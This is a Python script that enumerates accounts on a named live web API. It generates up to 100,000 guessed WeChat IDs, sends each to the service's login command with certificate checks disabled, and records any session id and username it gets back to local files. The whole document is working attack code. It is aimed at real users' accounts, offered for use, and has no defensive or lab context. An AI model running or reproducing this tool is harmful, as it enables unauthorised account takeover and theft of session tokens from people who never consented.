#!/usr/bin/env python3
"""
Targeted wechatId scanner - generates patterns based on real user data
Focuses on realistic formats like common_names + 3 digits
"""
import requests, urllib3, time, json, random, string, os
urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def wechat_login(wechatId):
    params = {"cmd": "1000", "wechatId": wechatId, "sid": "", **BASE_PARAMS}
    try:
        resp = requests.post(TARGET, data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            if isinstance(msg, dict) and msg.get("sid"):
                return msg.get("sid"), msg.get("username")
    except:
        pass
    return None, None

FIRST_NAMES = ["wei", "ming", "zhang", "li", "wang", "liu", "yang", "huang", "zhao", "wu"]
LAST_NAMES = ["", "", "01", "02", "001", "99", "88", "666", "123", "2023", "2024"]

def generate_targeted_patterns(count=100000):
    patterns = set()
    
    for fn in FIRST_NAMES:
        for ln in LAST_NAMES:
            patterns.add(f"{fn}{ln}")
            patterns.add(f"{fn}{ln}01")
            patterns.add(f"{fn}{ln}001")
    
    for init in ["a", "b", "c", "d", "e", "f"]:
        for num in range(1000, 9999):
            patterns.add(f"{init}{num}")
            if len(patterns) >= count:
                return list(patterns)
    
    vowels = "aeiou"
    consonants = "bcdfghjklmnpqrstvwxyz"
    for v in vowels:
        for c in consonants[:5]:
            for num in range(100, 999):
                patterns.add(f"{c}{v}{c}{v}{num:03d}")
                if len(patterns) >= count:
                    return list(patterns)
    
    while len(patterns) < count:
        pattern = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        patterns.add(pattern)
    
    return list(patterns)[:count]

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--count", type=int, default=100000)
    parser.add_argument("--delay", type=float, default=0.1)
    parser.add_argument("--save-dir", default=".")
    args = parser.parse_args()
    
    patterns = generate_targeted_patterns(args.count)
    os.makedirs(args.save_dir, exist_ok=True)
    
    print(f"[*] Scanning {len(patterns)} targeted patterns...")
    
    found = []
    for i, wechatId in enumerate(patterns):
        sid, username = wechat_login(wechatId)
        
        if sid:
            result = {"wechatId": wechatId, "sid": sid, "username": username}
            found.append(result)
            print(f"[+] FOUND: wechatId={wechatId}, sid={sid}, username={username}")
            
            with open(f"{args.save_dir}/found_wechatids.txt", "a") as f:
                f.write(f"{wechatId}|{sid}|{username}\n")
        
        if (i + 1) % 1000 == 0:
            print(f"[*] Progress: {i+1}/{len(patterns)} (found: {len(found)})")
        
        time.sleep(args.delay)
    
    with open(f"{args.save_dir}/targeted_enum_results.json", "w") as f:
        json.dump({"found": found, "total_scanned": len(patterns)}, f, indent=2)
    
    print(f"\n[*] Done! Found {len(found)} accounts")

if __name__ == "__main__":
    main()
